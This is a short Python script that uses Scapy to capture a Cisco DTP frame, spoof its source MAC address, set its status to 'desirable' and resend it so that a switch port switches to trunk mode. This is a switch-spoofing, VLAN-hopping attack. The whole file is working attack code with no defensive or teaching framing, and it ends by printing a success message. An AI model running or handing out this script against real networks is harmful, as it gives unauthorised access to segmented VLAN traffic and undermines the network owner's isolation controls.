#Import Scapy
from scapy.all import *
#Import DTP
load_contrib("dtp")
#Capture DTP frame
pkt = sniff(filter="ether dst 01:00:0c:cc:cc:cc",count=1)    
#Change the MAC address
pkt[0].src="00:00:00:11:11:11" 
#Change to desirable
pkt[0][DTP][DTPStatus].status='\x03'
#Send frame into network
#for i in range (0,50):***********
sendp(pkt[0],loop=0,verbose=1)
print("Link successfully changed to trunk mode.\nQuitting...")
    #time.sleep(5)**********

